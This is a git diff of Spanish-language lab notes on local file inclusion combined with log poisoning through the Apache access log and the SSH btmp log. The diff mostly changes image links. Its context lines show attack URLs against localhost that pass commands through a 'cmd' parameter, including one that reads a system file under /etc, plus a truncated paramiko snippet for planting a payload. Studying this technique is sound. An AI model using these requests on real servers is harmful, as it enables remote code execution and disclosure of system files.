@@ -38,8 +38,9 @@ http://localhost:8081/page.php?file=/var/log/apache2/access.log&cmd=cat%20/etc/h
 Podemos hacer lo mismo con ssh , cabe destacar que para este lo normal es encontrar un archivo auth.lo en el directorio /var/log/auth.log pero en la actualidad han habido cambio y normalment es el archivo btmp en el directorio /var/log
 
 Cuando intentamos conectar por ssh siempre registra un log en estos archivos antes mencionados.
-![[Pasted image 20260121085530.png]]
-![[Pasted image 20260121085744.png]]
+![](../../../attachments/Pasted%20image%2020260121085530.png)
+
+![](../../../attachments/Pasted%20image%2020260121085744.png)
 
 Como podemos proceder, pues insertando nuestro código en el lugar del usuario , para poder ejecutar este tipo de ataques debemos poder leer estos archivos desde la web
 ```bash
@@ -57,4 +58,4 @@ import paramiko ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(param
 http://localhost:8081/page.php?file=/var/log/btmp&cmd=ls -l
 ```
 
-![[Pasted image 20260121092613.png]]
+![](../../../attachments/Pasted%20image%2020260121092613.png)
